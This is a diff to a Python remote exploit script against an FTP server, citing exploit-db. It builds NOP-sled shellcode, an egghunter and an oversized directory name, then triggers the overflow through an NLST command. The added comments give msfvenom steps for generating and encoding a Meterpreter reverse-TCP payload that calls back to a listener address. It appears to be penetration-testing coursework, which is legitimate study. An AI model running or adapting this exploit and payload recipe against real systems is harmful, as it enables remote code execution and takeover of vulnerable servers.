@@ -1,3 +1,5 @@
+#https://www.exploit-db.com/exploits/16740/
+
 import socket
 import sys
 import time
@@ -14,6 +16,10 @@ from ftplib import FTP
 # \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x22\x2a\x2e\x2f\x3a\x3c\x3e\x3f\x5c\x7c
 
 #Shellcode excluding nops 366
+#msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.208 LPORT=4444 >payload
+#perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj
+#cat stackadj payload > shellcode
+#cat shellcode | msfvenom -b "\x00\x09\x0c\x20\x0a\x0d\x0b" -e x86/shikata_ga_nai -t python
 shellcode = ""
 shellcode += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
 shellcode += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
@@ -122,7 +128,7 @@ def drop_shellcode(sock, shellcode, egg):
         print data
         i = i+1
 
-def build_directory_buffer(egg):
+def build_directory_buffer(egg,patch,ret):
         
     hunt = "\xB8\x55\x55\x52\x55\x35\x55\x55\x55\x55\x40\x81\x38" +egg + "\x75\xF7\x40\x40\x40\x40\xFF\xE0"
     global pre
@@ -143,13 +149,10 @@ def create_tcp_server():
     svr_bind_ip = "0.0.0.0"
     global svr_bind_port
     svr_bind_port = 9999
-
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
     server.bind((svr_bind_ip, svr_bind_port))
-
     server.listen(5)
-    #print "[*] Listening on %s:%d" %(bind_ip,bind_port)
+    #print "[*] Listening on %s:%d" %(svr_bind_ip,svr_bind_port)
 
 
 def main():
@@ -207,7 +210,7 @@ def main():
     print "[+] Dropping shellcode onto stack."
     drop_shellcode(sock, shellcode, egg)
     print "[+] Building attack buffer for directory name"
-    d_buffer = build_directory_buffer(egg)
+    d_buffer = build_directory_buffer(egg, patch, ret)
     
     #send overflow directory buffer
     print "[+] Creating long directory..."
@@ -234,6 +237,6 @@ def main():
     sock.send("PORT %s" % srv_address)
     
     #trigger vulnerability
-    socket.send("NLST %s*/../%s*/" % (d_buffer, pre))
+    sock.send("NLST %s*/../%s*/" % (d_buffer, pre))
         
 main()
